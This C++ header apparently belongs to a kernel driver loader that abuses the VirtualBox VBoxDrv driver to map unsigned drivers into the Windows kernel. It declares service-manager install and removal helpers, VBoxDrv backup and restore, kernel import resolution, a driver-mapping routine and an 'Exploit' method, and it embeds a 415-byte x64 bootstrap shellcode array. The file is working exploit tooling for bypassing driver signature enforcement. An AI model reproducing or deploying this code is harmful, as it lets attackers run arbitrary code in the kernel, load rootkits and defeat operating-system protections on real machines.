#pragma once
#include <Windows.h>
#include <ntstatus.h>
#include <cstdio>
#include "VBoxDrv.h"

typedef NTSTATUS(NTAPI *PENUMOBJECTSCALLBACK)(POBJECT_DIRECTORY_INFORMATION Entry, PVOID CallbackParam);
NTSTATUS NTAPI DrvLdrEnumSystemObjects(_In_opt_ LPWSTR pwszRootDirectory, _In_opt_ HANDLE hRootDirectory, _In_ PENUMOBJECTSCALLBACK CallbackProc, _In_opt_ PVOID CallbackParam);
NTSTATUS NTAPI DetectObjectCallback(_In_ POBJECT_DIRECTORY_INFORMATION Entry, _In_ PVOID CallbackParam);

typedef struct _OBJSCANPARAM {
	PWSTR Buffer;
	ULONG BufferSize;
} OBJSCANPARAM, *POBJSCANPARAM;

class SCMDriverHelper {
private:
public:
	bool scmInstallDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, _Inout_opt_ LPCTSTR ServiceExe);
	bool scmStartDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName);
	bool scmOpenDevice(IN LPCTSTR DriverName, _Inout_opt_ PHANDLE lphDevice);
	bool scmStopDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName);
	bool scmRemoveDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName);
	bool scmUnloadDeviceDriver(IN LPCTSTR Name);
	bool scmLoadDeviceDriver(IN LPCTSTR Name, _Inout_opt_ LPCTSTR Path, _Inout_ PHANDLE lphDevice);
};

class DriverLoader {
private:
	inline bool PathFileExists(LPTSTR lpszPath) {
		return (GetFileAttributes(lpszPath) != (DWORD)-1);
	}
	bool fVBoxInstalled;
	LPCTSTR VBoxDrvSvc = TEXT("VBoxDrv");
	char ImageName[32];
	HANDLE g_hVBox;
	const int PAGE_SIZE = 0x1000;
	const ULONG scDataOffset = 0x214; //shellcode data offset
	const ULONG ImageHandle = 0x1a000;
	ULONG ResourceId;
	const unsigned char BootstrapLoader_code[415] = {
		0x40, 0x53, 0x56, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x70, 0x4C, 0x8B, 0xE2,
		0x4C, 0x89, 0xBC, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC9, 0x48, 0x8D, 0x1D, 0xDE, 0xFF,
		0xFF, 0xFF, 0x48, 0x81, 0xC3, 0x00, 0x02, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x54, 0x64, 0x6C,
		0x53, 0x4C, 0x63, 0x73, 0x3C, 0x4C, 0x03, 0xF3, 0x45, 0x8B, 0x7E, 0x50, 0x41, 0x8D, 0x97, 0x00,
		0x10, 0x00, 0x00, 0x41, 0xFF, 0xD1, 0x45, 0x33, 0xED, 0x48, 0x8D, 0xB0, 0x00, 0x10, 0x00, 0x00,
		0x48, 0x81, 0xE6, 0x00, 0xF0, 0xFF, 0xFF, 0x41, 0x83, 0xBE, 0x84, 0x00, 0x00, 0x00, 0x05, 0x0F,
		0x86, 0xAB, 0x00, 0x00, 0x00, 0x41, 0x8B, 0x8E, 0xB0, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x0F, 0x84,
		0x9C, 0x00, 0x00, 0x00, 0x48, 0x89, 0xAC, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x04, 0x0B,
		0x41, 0x8B, 0xAE, 0xB4, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xDE, 0x4D, 0x2B, 0x5E, 0x30, 0x48, 0x89,
		0xBC, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x41, 0x8B, 0xFD, 0x85, 0xED, 0x74, 0x63, 0x0F, 0x1F, 0x00,
		0x41, 0xB9, 0x08, 0x00, 0x00, 0x00, 0x4D, 0x8D, 0x50, 0x08, 0x45, 0x39, 0x48, 0x04, 0x76, 0x43,
		0x41, 0x0F, 0xB7, 0x02, 0x8B, 0xC8, 0xC1, 0xE9, 0x0C, 0x83, 0xF9, 0x03, 0x74, 0x17, 0x83, 0xF9,
		0x0A, 0x75, 0x22, 0x41, 0x8B, 0x10, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0C, 0x03, 0x4C,
		0x01, 0x1C, 0x0A, 0xEB, 0x10, 0x41, 0x8B, 0x10, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x0C,
		0x03, 0x44, 0x01, 0x1C, 0x0A, 0x49, 0x83, 0xC2, 0x02, 0x41, 0x83, 0xC1, 0x02, 0x45, 0x3B, 0x48,
		0x04, 0x72, 0xBD, 0x41, 0x8B, 0x40, 0x04, 0x03, 0xF8, 0x4C, 0x03, 0xC0, 0x3B, 0xFD, 0x72, 0xA0,
		0x48, 0x8B, 0xAC, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xBC, 0x24, 0xB0, 0x00, 0x00, 0x00,
		0x49, 0x8B, 0xD7, 0x4C, 0x8B, 0xBC, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xEA, 0x03, 0x48,
		0x85, 0xD2, 0x74, 0x1D, 0x48, 0x8B, 0xCE, 0x48, 0x2B, 0xDE, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
		0x48, 0x8B, 0x04, 0x0B, 0x48, 0x89, 0x01, 0x48, 0x8D, 0x49, 0x08, 0x48, 0x83, 0xEA, 0x01, 0x75,
		0xEF, 0x0F, 0x57, 0xC0, 0xC7, 0x44, 0x24, 0x40, 0x30, 0x00, 0x00, 0x00, 0xF3, 0x0F, 0x7F, 0x44,
		0x24, 0x60, 0x4C, 0x89, 0x6C, 0x24, 0x48, 0x4C, 0x8D, 0x44, 0x24, 0x40, 0xC7, 0x44, 0x24, 0x58,
		0x00, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x6C, 0x24,
		0x50, 0x45, 0x33, 0xC9, 0x41, 0x8B, 0x46, 0x28, 0xBA, 0xFF, 0xFF, 0x1F, 0x00, 0x48, 0x03, 0xC6,
		0x4C, 0x89, 0x6C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x4C, 0x89, 0x6C, 0x24, 0x20, 0x41,
		0xFF, 0xD4, 0x48, 0x83, 0xC4, 0x70, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5E, 0x5B, 0xC3
	};
	PBYTE QueryResourceData(HMODULE hModule, ULONG_PTR ResourceId, LPWSTR Type, PULONG DataSize); //"DATA"
	void StopVBoxDriver(HANDLE hVBox);
	HANDLE LoadVBoxDriver(PBYTE VBoxDriverBuffer, ULONG BufferSize);
	SIZE_T WriteBufferToFile(IN PWSTR lpFileName, IN PVOID Buffer, IN SIZE_T Size, IN BOOL Flush, IN BOOL Append);
	bool BackupVBoxDrv(IN bool bRestore);
	bool VBoxInstalled();
	bool ObjectExists(IN LPWSTR RootDirectory, IN LPWSTR ObjectName);
	PVOID GetSystemInfo(IN SYSTEM_INFORMATION_CLASS InfoClass);
	ULONG_PTR GetNtOsBase();
	void ResolveKernelImport(ULONG_PTR Image, ULONG_PTR KernelImage, ULONG_PTR KernelBase);
	ULONG_PTR GetProcAddress(ULONG_PTR KernelBase, ULONG_PTR KernelImage, LPCSTR FunctionName);
	UINT MapDriver(LPWSTR lpDriverFullName, PBYTE DriverBuffer = NULL);
	void Exploit(LPVOID Shellcode, ULONG CodeSize);
public:
	enum State {
		Success, SCMDatabaseOpenFail, VBoxUnloadFail, VBoxRemoveError, GetSystemDirectoryFail, VBoxBackupError,
		VBoxDriverOpenFail, VBoxDriverLoadFail, DriverOpenFail, VBoxDriverRemoveFail, VBoxDriverRestoreFail,
		VBoxWritingError, ntoskrnlLoadFail, PsCreateSystemThreadNotFound, ShellCodeAllocError, IoCtlCookieFail,
		IoCtlLdrOpenFail, IoCtlLoadFail, IoCtlSetVMFastCallFail, VBoxHandleInvalid, DriverPathError
	};
	State currentState = Success;
	DriverLoader(char *imgName) {
		strcpy_s(ImageName, 32, imgName);
	}
	char* GetImageName() {
		return ImageName;
	}
	State GetState() {
		return currentState;
	}
	UINT LoadDriverFromFile(WCHAR *szInputFile);
};